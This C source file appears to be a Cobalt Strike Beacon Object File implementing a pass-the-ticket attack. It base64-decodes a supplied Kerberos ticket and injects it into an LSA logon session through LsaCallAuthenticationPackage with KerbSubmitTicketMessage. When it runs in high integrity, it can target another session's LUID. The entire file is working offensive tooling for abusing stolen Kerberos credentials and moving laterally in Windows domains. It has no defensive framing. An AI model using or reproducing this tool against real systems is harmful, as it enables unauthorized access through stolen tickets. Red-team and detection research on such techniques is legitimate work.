#include "ptt.h"

void execute_ptt(HANDLE hToken, char* ticket, LUID luid, BOOL currentLuid) {
    BOOL highIntegrity = IsHighIntegrity(hToken);
    if (!highIntegrity && !currentLuid) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Not in high integrity.\n");
        return;
    }
    HANDLE hLsa;
    if (currentLuid) {
        highIntegrity = FALSE;
    }
    NTSTATUS status = GetLsaHandle(hToken, highIntegrity, &hLsa);
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] GetLsaHandle %ld\n", status);
        return;
    }
    ULONG authPackage;
    LSA_STRING krbAuth = {.Buffer = "kerberos", .Length = 8, .MaximumLength = 9};
    status = SECUR32$LsaLookupAuthenticationPackage(hLsa, &krbAuth, &authPackage);
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] LsaLookupAuthenticationPackage %ld\n", ADVAPI32$LsaNtStatusToWinError(status));
        SECUR32$LsaDeregisterLogonProcess(hLsa);
        return;
    }

    int decoded_len = Base64decode_len(ticket);
    char* decoded = (char*)MSVCRT$calloc(decoded_len, sizeof(char));
    if (decoded == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Base64 - could not allocate the memory.\n");
        SECUR32$LsaDeregisterLogonProcess(hLsa);
        return;
    }
    Base64decode(decoded, ticket);
    KERB_SUBMIT_TKT_REQUEST* submitRequest = NULL;
    int submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + decoded_len;
    submitRequest = (KERB_SUBMIT_TKT_REQUEST*)MSVCRT$calloc(submitSize, sizeof(KERB_SUBMIT_TKT_REQUEST));
    if (submitRequest == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[!] KERB_SUBMIT_TKT_REQUEST - could not allocate memory.\n");
        MSVCRT$free(decoded);
        SECUR32$LsaDeregisterLogonProcess(hLsa);
        return;
    }
    submitRequest->MessageType = KerbSubmitTicketMessage;
    submitRequest->KerbCredSize = decoded_len;
    submitRequest->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
    if (highIntegrity) {
        submitRequest->LogonId = luid;
    }
    MSVCRT$memcpy((PBYTE)submitRequest + submitRequest->KerbCredOffset, decoded, decoded_len);
    MSVCRT$free(decoded);
    NTSTATUS protocolStatus;
    ULONG responseSize;
    PVOID response;
    status = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, submitRequest, submitSize, &response,
                                                  &responseSize, &protocolStatus);
    if (NT_SUCCESS(status)) {
        if (NT_SUCCESS(protocolStatus)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Ticket successfully imported.\n");
        } else {
            status = ADVAPI32$LsaNtStatusToWinError(protocolStatus);
            BeaconPrintf(CALLBACK_ERROR, "[!] LsaCallAuthenticationPackage ProtocolStatus: %ld\n", status);
        }
    } else {
        status = ADVAPI32$LsaNtStatusToWinError(status);
        BeaconPrintf(CALLBACK_ERROR, "[!] LsaCallAuthenticationPackage Status: %ld\n", status);
    }

    if (submitRequest != NULL) {
        MSVCRT$free(submitRequest);
    }
    SECUR32$LsaDeregisterLogonProcess(hLsa);
}
